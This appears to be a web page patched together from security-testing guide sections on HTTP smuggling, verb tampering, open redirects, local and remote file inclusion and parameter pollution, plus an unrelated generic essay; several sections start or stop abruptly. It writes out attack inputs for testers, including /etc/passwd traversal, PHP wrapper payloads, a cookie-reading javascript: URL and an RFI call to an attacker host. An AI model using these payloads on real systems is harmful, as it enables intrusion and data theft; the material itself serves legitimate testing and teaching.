        <li>The pen-tester must properly set the headers in the fake response for it to be successfully cached (e.g., a Last-Modified header with a date set in the future). They might also have to destroy previously cached versions of the target pagers, by issuing a preliminary request with <code class="language-plaintext highlighter-rouge">Pragma: no-cache</code> in the request headers</li>
        <li>The application, while not filtering the CR+LF sequence, might filter other characters that are needed for a successful attack (e.g., <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code>). In this case, the tester can try to use other encodings (e.g., UTF-7)</li>
        <li>Some targets (e.g., ASP) will URL-encode the path part of the Location header (e.g., <code class="language-plaintext highlighter-rouge">www.victim.com/redirect.asp</code>), making a CRLF sequence useless. However, they fail to encode the query section (e.g., ?interface=advanced), meaning that a leading question mark is enough to bypass this filtering</li>
        </ol>
        <p>For a more detailed discussion about this attack and other information about possible scenarios and applications, check the papers referenced at the bottom of this section.</p>
        <h3 id="gray-box-testing">Gray-Box Testing</h3>
        <h4 id="http-splitting-1">HTTP Splitting</h4>
        <p>A successful exploitation of HTTP Splitting is greatly helped by knowing some details of the web application and of the attack target. For instance, different targets can use different methods to decide when the first HTTP message ends and when the second starts. Some will use the message boundaries, as in the previous example. Other targets will assume that different messages will be carried by different packets. Others will allocate for each message a number of chunks of predetermined length: in this case, the second message will have to start exactly at the beginning of a chunk and this will require the tester to use padding between the two messages. This might cause some trouble when the vulnerable parameter is to be sent in the URL, as a very long URL is likely to be truncated or filtered. A gray-box scenario can help the attacker to find a workaround: several application servers, for instance, will allow the request to be sent using POST instead of GET.</p>
        <h4 id="http-smuggling">HTTP Smuggling</h4>
        <p>As mentioned in the introduction, HTTP Smuggling leverages the different ways that a particularly crafted HTTP message can be parsed and interpreted by different agents (browsers, web caches, application firewalls). This relatively new kind of attack was first discovered by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin in 2005. There are several possible applications and we will analyze one of the most spectacular: the bypass of an application firewall. Refer to the original whitepaper (linked at the bottom of this page) for more detailed information and other scenarios.</p>
        <h5 id="application-firewall-bypass">Application Firewall Bypass</h5>
        <p>There are several products that enable a system administration to detect and block a hostile web request depending on some known malicious pattern that is embedded in the request. For example, consider the infamous, old <a href="https://www.securityfocus.com/bid/1806">Unicode directory traversal attack against IIS server</a>, in which an attacker could break out the www root by issuing a request like:</p>
        <p><code class="language-plaintext highlighter-rouge">http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+&lt;command_to_execute&gt;</code></p>
        <p>Of course, it is quite easy to spot and filter this attack by the presence of strings like &ldquo;..&rdquo; and &ldquo;cmd.exe&rdquo; in the URL. However, IIS 5.0 is quite picky about POST requests whose body is up to 48K bytes and truncates all content that is beyond this limit when the Content-Type header is different from application/x-www-form-urlencoded. The pen-tester can leverage this by creating a very large request, structured as follows:</p>
        <div class="language-html highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>POST /target.asp HTTP/1.1        <span class="nt">&lt;--</span> <span class="na">Request</span> <span class="na">#1</span>
        <span class="na">Host:</span> <span class="na">target</span>
        <span class="na">Connection:</span> <span class="na">Keep-Alive</span>
        <span class="na">Content-Length:</span> <span class="err">49225</span>
        <span class="err">&lt;</span><span class="na">CRLF</span><span class="nt">&gt;</span>
        <span class="nt">&lt;</span><span class="err">49152</span> <span class="na">bytes</span> <span class="na">of</span> <span class="na">garbage</span><span class="nt">&gt;</span>
        </code></pre>
        </div>
        </div>
        <div class="language-html highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>POST /target.asp HTTP/1.0        <span class="nt">&lt;--</span> <span class="na">Request</span> <span class="na">#2</span>

        <span class="err">&lt;</span><span class="na">CRLF</span><span class="nt">&gt;</span>
        </code></pre>
        </div>
        </div>
        <p>What happens here is that the <code class="language-plaintext highlighter-rouge">Request #1</code> is made of 49223 bytes, which includes also the lines of <code class="language-plaintext highlighter-rouge">Request #2</code>. Therefore, a firewall (or any other agent beside IIS 5.0) will see Request #1, will fail to see <code class="language-plaintext highlighter-rouge">Request #2</code> (its data will be just part of #1), will see <code class="language-plaintext highlighter-rouge">Request #3</code> and miss <code class="language-plaintext highlighter-rouge">Request #4</code> (because the POST will be just part of the fake header xxxx).</p>
        <p>Now, what happens to IIS 5.0 ? It will stop parsing <code class="language-plaintext highlighter-rouge">Request #1</code> right after the 49152 bytes of garbage (as it will have reached the 48K=49152 bytes limit) and will therefore parse <code class="language-plaintext highlighter-rouge">Request #2</code> as a new, separate request. <code class="language-plaintext highlighter-rouge">Request #2</code> claims that its content is 33 bytes, which includes everything until &ldquo;xxxx: &ldquo;, making IIS miss <code class="language-plaintext highlighter-rouge">Request #3</code> (interpreted as part of <code class="language-plaintext highlighter-rouge">Request #2</code>) but spot <code class="language-plaintext highlighter-rouge">Request #4</code>, as its POST starts right after the 33rd byte or <code class="language-plaintext highlighter-rouge">Request #2</code>. It is a bit complicated, but the point is that the attack URL will not be detected by the firewall (it will be interpreted as the body of a previous request) but will be correctly parsed (and executed) by IIS.</p>
        <p>While in the aforementioned case the technique exploits a bug of a web server, there are other scenarios in which we can leverage the different ways that different HTTP-enabled devices parse messages that are not 1005 RFC compliant. For instance, the HTTP protocol allows only one Content-Length header, but does not specify how to handle a message that has two instances of this header. Some implementations will use the first one while others will prefer the second, cleaning the way for HTTP Smuggling attacks. Another example is the use of the Content-Length header in a GET message.</p>
        <p>Note that HTTP Smuggling does <code class="language-plaintext highlighter-rouge">*not*</code> exploit any vulnerability in the target web application. Therefore, it might be somewhat tricky, in a pen-test engagement, to convince the client that a countermeasure should be looked for anyway.</p>

        <h4>HTTP Verb Tampering tests the web application&rsquo;s response to different HTTP methods accessing system objects. For every system object discovered during spidering, the tester should attempt accessing all of those objects with every HTTP method.</h4>
        <p>The HTTP specification includes request methods other than the standard GET and POST requests. A standards compliant web server may respond to these alternative methods in ways not anticipated by developers. Although the common description is <code class="language-plaintext highlighter-rouge">verb</code> tampering, the HTTP 1.1 standard refers to these request types as different HTTP <code class="language-plaintext highlighter-rouge">methods</code>.</p>
        
        <p>However, most web applications only need to respond to GET and POST requests, providing user data in the URL query string or appended to the request respectively. The standard <code class="language-plaintext highlighter-rouge">&lt;a href=""&gt;&lt;/a&gt;</code> style links trigger a GET request; form data submitted via <code class="language-plaintext highlighter-rouge">&lt;form method='POST'&gt;&lt;/form&gt;</code>trigger POST requests. Forms defined without a method also send data via GET by default.</p>
        <p>Oddly, the other valid HTTP methods are not supported by the <a href="https://www.w3.org/TR/REC-html40/interact/forms.html#h-17.13.1">HTML standard</a>. Any HTTP method other than GET or POST needs to be called outside the HTML document. However, JavaScript and AJAX calls may send methods other than GET and POST.</p>
        <p>As long as the web application being tested does not specifically call for any non-standard HTTP methods, testing for HTTP verb tampering is quite simple. If the server accepts a request other than GET or POST, the test fails. The solutions is to disable all non GET or POST functionality within the web application server, or in a web application firewall.</p>
        <p>If methods such as HEAD or OPTIONS are required for your application, this increases the burden of testing substantially. Each action within the system will need to be verified that these alternate methods do not trigger actions without proper authentication or reveal information about the contents or workings web application. If possible, limit alternate HTTP method usage to a single page that contains no user actions, such the default landing page (example: index.html).</p>
        <h2 id="how-to-test">How to Test</h2>
        <p>As the HTML standard does not support request methods other than GET or POST, we will need to craft custom HTTP requests to test the other methods. We highly recommend using a tool to do this, although we will demonstrate how to do manually as well.</p>
        <h3 id="manual-http-verb-tampering-testing">Manual HTTP Verb Tampering Testing</h3>
        <p>This example is written using the netcat package from openbsd (standard with most Linux distributions). You may also use telnet (included with Windows) in a similar fashion.</p>
        <ol>
        <li>
        <p>Crafting custom HTTP requests</p>
        <p>Each HTTP 1.1 request follows the following basic formatting and syntax. Elements surrounded by brackets <code class="language-plaintext highlighter-rouge">[ ]</code> are contextual to your application. The empty newline at the end is required.</p>
        <div class="language-html highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>[METHOD] /[index.htm] HTTP/1.1
        host: [www.example.com]
        </code></pre>
        </div>
        </div>
        <p>In order to craft separate requests, you can manually type each request into netcat or telnet and examine the response. However, to speed up testing, you may also store each request in a separate file. This second approach is what we&rsquo;ll demonstrate in these examples. Use your favorite editor to create a text file for each method. Modify for your application&rsquo;s landing page and domain.</p>

        <p>Although each HTTP method can potentially return different results, there is only a single valid result for all methods other than GET and POST.

  </br>
    <h4>This section describes how to check for client side URL redirection, also known as open redirection. It is an input validation flaw that exists when an application accepts user-controlled input that specifies a link which leads to an external URL that could be malicious. This kind of vulnerability could be used to accomplish a phishing attack or redirect a victim to an infection page.</h4>
    <p>This vulnerability occurs when an application accepts untrusted input that contains a URL value and does not sanitize it. This URL value could cause the web application to redirect the user to another page, such as a malicious page controlled by the attacker.</p>
    <p>This vulnerability may enable an attacker to successfully launch a phishing scam and steal user credentials. Since the redirection is originated by the real application, the phishing attempts may have a more trustworthy appearance.</p>
    <p>Here is an example of a phishing attack URL.</p>
    <pre><code class="language-url">http://www.target.site?#redirect=www.fake-target.site
    </code></pre>
    <p>The victim that visits this URL will be automatically redirected to <code class="language-plaintext highlighter-rouge">fake-target.site</code>, where an attacker could place a fake page that resembles the intended site, in order to steal the victim&rsquo;s credentials.</p>
    <p>Open redirection could also be used to craft a URL that would bypass the application&rsquo;s access control checks and forward the attacker to privileged functions that they would normally not be able to access.</p>
    <h2 id="how-to-test">How to Test</h2>
    <p>When testers manually check for this type of vulnerability, they first identify if there are client side redirections implemented in the client side code. These redirections may be implemented, to give a JavaScript example, using the <code class="language-plaintext highlighter-rouge">window.location</code> object. This can be used to direct the browser to another page by simply assigning a string to it. This is demonstrated in the following snippet:</p>
    <div class="language-js highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kd">var</span> <span class="nx">redir</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">redir</span><span class="p">)</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://</span><span class="dl">'</span><span class="o">+</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">redir</span><span class="p">);</span>
    </code></pre>
    </div>
    </div>
    <p>In this example, the script does not perform any validation of the variable <code class="language-plaintext highlighter-rouge">redir</code> which contains the user-supplied input via the query string. Since no form of encoding is applied, this unvalidated input is passed to the <code class="language-plaintext highlighter-rouge">windows.location</code> object, creating a URL redirection vulnerability.</p>
    <p>This implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string:</p>
    <pre><code class="language-url">http://www.victim.site/?#www.malicious.site
    </code></pre>
    <p>With a slight modification, the above example snippet can be vulnerable to JavaScript injection.</p>
    <div class="language-js highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kd">var</span> <span class="nx">redir</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">redir</span><span class="p">)</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">redir</span><span class="p">);</span>
    </code></pre>
    </div>
    </div>
    <p>This can be exploited by submitting the following query string:</p>
    <pre><code class="language-url">http://www.victim.site/?#javascript:alert(document.cookie)
    </code></pre>
    <p>When testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">DOM-based XSS</a>.</p>

        <h4 id="testing-for-local-file-inclusion">Testing for Local File Inclusion</h1></br>
        <p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &ldquo;dynamic file inclusion&rdquo; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</h4>
        <p>This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:</p>
        <ul>
        <li>Code execution on the web server</li>
        <li>Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)</li>
        <li>Denial of Service (DoS)</li>
        <li>Sensitive Information Disclosure</li>
        </ul>
        <p>Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.</p>
        <h2 id="how-to-test">How to Test</h2>
        <p>Since LFI occurs when paths passed to <code class="language-plaintext highlighter-rouge">include</code> statements are not properly sanitized, in a blackbox testing approach, we should look for scripts which take filenames as parameters.</p>
        <p>Consider the following example:</p>
        <p><code class="language-plaintext highlighter-rouge">http://vulnerable_host/preview.php?file=example.html</code></p>
        <p>This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the server.</p>
        <p>Typical proof-of-concept would be to load passwd file:</p>
        <p><code class="language-plaintext highlighter-rouge">http://vulnerable_host/preview.php?file=../../../../etc/passwd</code></p>
        <p>If the above mentioned conditions are met, an attacker would see something like the following:</p>
        <div class="language-bash highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
        bin:x:1:1:bin:/bin:/sbin/nologin
        daemon:x:2:2:daemon:/sbin:/sbin/nologin
        alex:x:500:500:alex:/home/alex:/bin/bash
        margo:x:501:501::/home/margo:/bin/bash
        ...
        </code></pre>
        </div>
        </div>
        <p>Even when such a vulnerability exists, its exploitation could be more complex in real life scenarios. Consider the following piece of code:</p>
        <div class="language-php highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">);</span> <span class="cp">?&gt;</span>
        </code></pre>
        </div>
        </div>
        <p>Simple substitution with a random filename would not work as the postfix <code class="language-plaintext highlighter-rouge">.php</code> is appended to the provided input. In order to bypass it, a tester can use several techniques to get the expected exploitation.</p>
        <h3 id="null-byte-injection">Null Byte Injection</h3>
        <p>The <code class="language-plaintext highlighter-rouge">null character</code> (also known as <code class="language-plaintext highlighter-rouge">null terminator</code> or <code class="language-plaintext highlighter-rouge">null byte</code>) is a control character with the value zero present in many character sets that is being used as a reserved character to mark the end of a string. Once used, any character after this special byte will be ignored. Commonly the way to inject this character would be with the URL encoded string <code class="language-plaintext highlighter-rouge">%00</code> by appending it to the requested path. In our previous sample, performing a request to <code class="language-plaintext highlighter-rouge">http://vulnerable_host/preview.php?file=../../../../etc/passwd%00</code> would ignore the <code class="language-plaintext highlighter-rouge">.php</code> extension being added to the input filename, returning to an attacker a list of basic users as a result of a successful exploitation.</p>
        <h3 id="path-and-dot-truncation">Path and Dot Truncation</h3>
        <p>Most PHP installations have a filename limit of 4096 bytes. If any given filename is longer than that length, PHP simply truncates it, discarding any additional characters. Abusing this behavior makes it possible to make the PHP engine ignore the <code class="language-plaintext highlighter-rouge">.php</code> extension by moving it out of the 4096 bytes limit. When this happens, no error is triggered; the additional characters are simply dropped and PHP continues its execution normally.</p>
        <p>This bypass would commonly be combined with other logic bypass strategies such as encoding part of the file path with Unicode encoding, the introduction of double encoding, or any other input that would still represent the valid desired filename.</p>
        <h3 id="php-wrappers">PHP Wrappers</h3>
        <p>Local File Inclusion vulnerabilities are commonly seen as read only vulnerabilities that an attacker can use to read sensitive data from the server hosting the vulnerable application. However, in some specific implementations this vulnerability can be used to upgrade the attack <a href="https://www.corben.io/zip-to-rce-lfi/">from LFI to Remote Code Execution</a> vulnerabilities that could potentially fully compromise the host.</p>
        <p>This enhancement is common when an attacker could be able to combine the <a href="https://www.netsparker.com/blog/web-security/php-stream-wrappers/">LFI vulnerability with certain PHP wrappers</a>.</p>
        <p>A wrapper is a code that surrounds other code to perform some added functionality. PHP implements many <a href="https://www.php.net/manual/en/wrappers.php">built-in wrappers</a> to be used with file system functions. Once their usage is detected during the testing process of an application, it&rsquo;s a good practice to try to abuse it to identify the real risk of the detected weakness(es). Below you can get a list with the most commonly used wrappers, even though you should consider that it is not exhaustive and at the same time it is possible to register custom wrappers that if employed by the target, would require a deeper ad hoc analysis.</p>
        <h4 id="php-filter">PHP Filter</h4>
        <p>Used to access the local file system; this is a case insensitive wrapper that provides the capability to apply filters to a stream at the time of opening a file. This wrapper can be used to get content of a file preventing the server from executing it. For example, allowing an attacker to read the content of PHP files to get source code to identify sensitive information such as credentials or other exploitable vulnerabilities.</p>
        <p>The wrapper can be used like <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=FILE</code> where <code class="language-plaintext highlighter-rouge">FILE</code> is the file to retrieve. As a result of the usage of this execution, the content of the target file would be read, encoded to base64 (this is the step that prevents the execution server-side), and returned to the User-Agent.</p>
        <h4 id="php-zip">PHP ZIP</h4>
        <p>On PHP 7.2.0, the <code class="language-plaintext highlighter-rouge">zip://</code> wrapper was introduced to manipulate <code class="language-plaintext highlighter-rouge">zip</code> compressed files. This wrapper expects the following parameter structure: <code class="language-plaintext highlighter-rouge">zip:///filename_path#internal_filename</code> where <code class="language-plaintext highlighter-rouge">filename_path</code> is the path to the malicious file and <code class="language-plaintext highlighter-rouge">internal_filename</code> is the path where the malicious file is place inside the processed ZIP file. During the exploitation, it&rsquo;s common that the <code class="language-plaintext highlighter-rouge">#</code> would be encoded with it&rsquo;s URL Encoded value <code class="language-plaintext highlighter-rouge">%23</code>.</p>
        <p>Abuse of this wrapper could allow an attacker to design a malicious ZIP file that could be uploaded to the server, for example as an avatar image or using any file upload system available on the target website (the <code class="language-plaintext highlighter-rouge">php:zip://</code> wrapper does not require the zip file to have any specific extension) to be executed by the LFI vulnerability.</p>
        <p>In order to test this vulnerability, the following procedure could be followed to attack the previous code example provided.</p>
        <ol>
        <li>Create the PHP file to be executed, for example with the content <code class="language-plaintext highlighter-rouge">&lt;?php phpinfo(); ?&gt;</code> and save it as <code class="language-plaintext highlighter-rouge">code.php</code></li>
        <li>Compress it as a new ZIP file called <code class="language-plaintext highlighter-rouge">target.zip</code></li>
        <li>Rename the <code class="language-plaintext highlighter-rouge">target.zip</code> file to <code class="language-plaintext highlighter-rouge">target.jpg</code> to bypass the extension validation and upload it to the target website as your avatar image.</li>
        <li>Supposing that the <code class="language-plaintext highlighter-rouge">target.jpg</code> file is stored locally on the server to the <code class="language-plaintext highlighter-rouge">../avatar/target.jpg</code> path, exploit the vulnerability with the PHP ZIP wrapper by injecting the following payload to the vulnerable URL: <code class="language-plaintext highlighter-rouge">zip://../avatar/target.jpg%23code</code> (remember that <code class="language-plaintext highlighter-rouge">%23</code> corresponds to <code class="language-plaintext highlighter-rouge">#</code>).</li>
        </ol>
        <p>Since on our sample the <code class="language-plaintext highlighter-rouge">.php</code> extension is concatenated to our payload, the request to <code class="language-plaintext highlighter-rouge">http://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code</code> will result in the execution of the <code class="language-plaintext highlighter-rouge">code.php</code> file existing in the malicious ZIP file.</p>
        <h4 id="php-data">PHP Data</h4>
        <p>Available since PHP 5.2.0, this wrapper expects the following usage: <code class="language-plaintext highlighter-rouge">data://text/plain;base64,BASE64_STR</code> where <code class="language-plaintext highlighter-rouge">BASE64_STR</code> is expected to be the Base64 encoded content of the file to be processed. It&rsquo;s important to consider that this wrapper would only be avaliable if the option <code class="language-plaintext highlighter-rouge">allow_url_include</code> would be enabled.</p>
        <p>In order to test the LFI using this wrapper, the code to be executed should be Base64 encoded, for example, the <code class="language-plaintext highlighter-rouge">&lt;?php phpinfo(); ?&gt;</code> code would be encoded as: <code class="language-plaintext highlighter-rouge">PD9waHAgcGhwaW5mbygpOyA/Pg==</code> so the payload would result as: <code class="language-plaintext highlighter-rouge">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</code>.</p>
        <h4 id="php-expect">PHP Expect</h4>
        <p>This wrapper, which is not enabled by default, provides access to processes <code class="language-plaintext highlighter-rouge">stdio</code>, <code class="language-plaintext highlighter-rouge">stdout</code> and <code class="language-plaintext highlighter-rouge">stderr</code>. Expecting to be used as <code class="language-plaintext highlighter-rouge">expect://command</code> the server would execute the provided command on <code class="language-plaintext highlighter-rouge">BASH</code> and return it&rsquo;s result.</p>

    <h4>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &ldquo;dynamic file inclusion&rdquo; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</h4>
    <p>This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:</p>
    <ul>
    <li>Code execution on the web server</li>
    <li>Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)</li>
    <li>Denial of Service (DoS)</li>
    <li>Sensitive Information Disclosure</li>
    </ul>
    <p>Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.</p>
    <h2 id="how-to-test">How to Test</h2>
    <p>Since RFI occurs when paths passed to &ldquo;include&rdquo; statements are not properly sanitized, in a black-box testing approach, we should look for scripts which take filenames as parameters. Consider the following PHP example:</p>
    <div class="language-php highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nv">$incfile</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
    <span class="k">include</span><span class="p">(</span><span class="nv">$incfile</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">);</span>
    </code></pre>
    </div>
    </div>
    <p>In this example the path is extracted from the HTTP request and no input validation is done (for example, by checking the input against an allow list), so this snippet of code results vulnerable to this type of attack. Consider the following URL:</p>
    <p><code class="language-plaintext highlighter-rouge">http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page</code></p>
    <p>In this case the remote file is going to be included and any code contained in it is going to be run by the server.</p>
    <h2 id="remediation">Remediation</h2>
    <p>The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API.

				 <h4>Server-Client rules are a set of protocols, standards, and practices that govern the interaction between a server and a client in a networked environment. These rules dictate how clients and servers communicate, ensuring data is exchanged efficiently, securely, and according to agreed-upon protocols. The purpose of these rules is to provide consistent, reliable communication that supports the functionality of web applications, APIs, and other network services.</h4>

    <h2>Types of Server-Client Rules</h2>
    <p>Server-client interactions can be categorized into various rules based on communication protocols and functionalities. Some of the most common types of server-client rules include:</p>
    <ul>
        <li><strong>Request-Response Model:</strong> In this model, a client sends a request to the server, and the server processes the request and responds accordingly. This is the foundation of many web applications and services.</li>
        <li><strong>Authentication and Authorization:</strong> Servers typically enforce authentication rules to ensure that clients are who they claim to be. Once authenticated, clients are authorized based on their roles or permissions to access certain resources or perform actions.</li>
        <li><strong>Data Validation and Sanitization:</strong> Servers are responsible for validating and sanitizing input received from clients to ensure data integrity, prevent malicious activity (e.g., XSS, SQL injection), and maintain the security of the application.</li>
        <li><strong>Session Management:</strong> Server-client rules include how sessions are managed, such as maintaining a session state, using cookies or tokens, and implementing secure session timeouts.</li>
        <li><strong>Security Protocols:</strong> Communication between server and client is often secured with protocols such as HTTPS (SSL/TLS) to encrypt the data being exchanged, ensuring confidentiality and integrity during transmission.</li>
        <li><strong>Rate Limiting and Throttling:</strong> To prevent abuse, servers may impose rules on the frequency of requests from clients, ensuring that the server can handle load efficiently and that no single client overwhelms the system.</li>
        <li><strong>Error Handling:</strong> Servers and clients have specific rules on how errors are handled. Proper error handling ensures that both parties can recover gracefully and that sensitive error details are not exposed to the end-user.</li>
    </ul>

    <h2>Communication Protocols in Server-Client Interactions</h2>
    <p>Various communication protocols are used to implement the server-client rules effectively. Some common protocols include:</p>
    <ul>
        <li><strong>HTTP/HTTPS:</strong> Hypertext Transfer Protocol (HTTP) is the most widely used protocol for communication between clients (browsers) and web servers. HTTPS is the secure version of HTTP that uses SSL/TLS encryption to protect the data during transmission.</li>
        <li><strong>FTP/SFTP:</strong> File Transfer Protocol (FTP) is used for transferring files between a client and a server. SFTP (Secure File Transfer Protocol) is the secure version of FTP that encrypts the data during the transfer.</li>
        <li><strong>WebSockets:</strong> WebSockets allow for persistent, bidirectional communication between the server and the client, ideal for real-time applications such as chat apps or live notifications.</li>
        <li><strong>SOAP/REST APIs:</strong> APIs are commonly used for server-client interactions, especially in web services. SOAP (Simple Object Access Protocol) and REST (Representational State Transfer) are two common approaches for implementing web services with defined rules for data exchange between clients and servers.</li>
    </ul>

    <h2>Best Practices for Server-Client Communication</h2>
    <p>For efficient and secure communication between servers and clients, certain best practices should be followed:</p>
    <ul>
        <li><strong>Secure Communication:</strong> Always use HTTPS (SSL/TLS) for transmitting sensitive data to protect it from interception and tampering by unauthorized parties.</li>
        <li><strong>Input Validation:</strong> Ensure that all input from clients is validated and sanitized to prevent common vulnerabilities such as SQL injection, XSS, and command injection.</li>
        <li><strong>Authentication and Authorization:</strong> Implement strong authentication mechanisms (e.g., multi-factor authentication) and ensure that users can only access resources they are authorized to view or modify.</li>
        <li><strong>Rate Limiting:</strong> Enforce rate limiting to prevent Denial of Service (DoS) attacks or resource exhaustion by controlling how frequently clients can send requests to the server.</li>
        <li><strong>Session Security:</strong> Use secure session management practices, such as using session tokens, encrypting cookies, and implementing timeouts or expiration periods for sessions.</li>
        <li><strong>Proper Error Handling:</strong> Avoid exposing sensitive error details to the client. Instead, provide generic error messages to the user and log detailed error information server-side for analysis.</li>
    </ul>

    <h2>Challenges in Server-Client Interactions</h2>
    <p>Server-client communication can sometimes face challenges that can impact functionality, performance, or security. Some common challenges include:</p>
    <ul>
        <li><strong>Latency:</strong> The time it takes for a request to travel from the client to the server and for the response to return can impact user experience, especially in real-time applications.</li>
        <li><strong>Server Overload:</strong> An excessive number of requests from clients, especially in high-traffic scenarios, can overwhelm the server, leading to slow responses or service unavailability.</li>
        <li><strong>Man-in-the-Middle (MITM) Attacks:</strong> Without proper encryption (e.g., HTTPS), communication between the client and server can be intercepted and altered by malicious actors.</li>
        <li><strong>Compatibility:</strong> Ensuring that different versions of the client and server software remain compatible is essential for uninterrupted communication and functionality.</li>
        <li><strong>Data Integrity:</strong> Ensuring that the data exchanged between the client and server is not tampered with during transmission is crucial to maintaining trust and reliability.</li>
    </ul>

    </br>
    <h4>HTTP Parameter Pollution tests the applications response to receiving multiple HTTP parameters with the same name; for example, if the parameter <code class="language-plaintext highlighter-rouge">username</code> is included in the GET or POST parameters twice.</h4>
    <p>Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short <em>HPP</em>) affects a building block of all web technologies, server and client-side attacks exist.</p>
    <p>Current HTTP standards do not include guidance on how to interpret multiple input parameters with the same name. For instance, <a href="https://www.ietf.org/rfc/rfc3986.txt">RFC 3986</a> simply defines the term <em>Query String</em> as a series of field-value pairs and <a href="https://www.ietf.org/rfc/rfc2396.txt">RFC 2396</a> defines classes of reversed and unreserved query string characters. Without a standard in place, web application components handle this edge case in a variety of ways (see the table below for details).</p>
    <p>By itself, this is not necessarily an indication of vulnerability. However, if the developer is not aware of the problem, the presence of duplicated parameters may produce an anomalous behavior in the application that can be potentially exploited by an attacker. As often in security, unexpected behaviors are a usual source of weaknesses that could lead to HTTP Parameter Pollution attacks in this case. To better introduce this class of vulnerabilities and the outcome of HPP attacks, it is interesting to analyze some real-life examples that have been discovered in the past.</p>
    <h3 id="input-validation-and-filters-bypass">Input Validation and Filters Bypass</h3>
    <p>In 2009, immediately after the publication of the first research on HTTP Parameter Pollution, the technique received attention from the security community as a possible way to bypass web application firewalls.</p>
    <p>One of these flaws, affecting <em>ModSecurity SQL Injection Core Rules</em>, represents a perfect example of the impedance mismatch between applications and filters. The ModSecurity filter would correctly apply a deny list for the following string: <code class="language-plaintext highlighter-rouge">select 1,2,3 from table</code>, thus blocking this example URL from being processed by the web server: <code class="language-plaintext highlighter-rouge">/index.aspx?page=select 1,2,3 from table</code>. However, by exploiting the concatenation of multiple HTTP parameters, an attacker could cause the application server to concatenate the string after the ModSecurity filter already accepted the input. As an example, the URL <code class="language-plaintext highlighter-rouge">/index.aspx?page=select 1&amp;page=2,3</code> from table would not trigger the ModSecurity filter, yet the application layer would concatenate the input back into the full malicious string.</p>
    <p>Another HPP vulnerability turned out to affect <em>Apple Cups</em>, the well-known printing system used by many UNIX systems. Exploiting HPP, an attacker could easily trigger a Cross-Site Scripting vulnerability using the following URL: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&amp;kerberos</code>. The application validation checkpoint could be bypassed by adding an extra <code class="language-plaintext highlighter-rouge">kerberos</code> argument having a valid string (e.g. empty string). As the validation checkpoint would only consider the second occurrence, the first <code class="language-plaintext highlighter-rouge">kerberos</code> parameter was not properly sanitized before being used to generate dynamic HTML content. Successful exploitation would result in JavaScript code execution under the context of the hosting site.</p>
    <h3 id="authentication-bypass">Authentication Bypass</h3>
    <p>An even more critical HPP vulnerability was discovered in <em>Blogger</em>, the popular blogging platform. The bug allowed malicious users to take ownership of the victim&rsquo;s blog by using the following HTTP request (<code class="language-plaintext highlighter-rouge">https://www.blogger.com/add-authors.do</code>):</p>
    <div class="language-html highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code>POST /add-authors.do HTTP/1.1
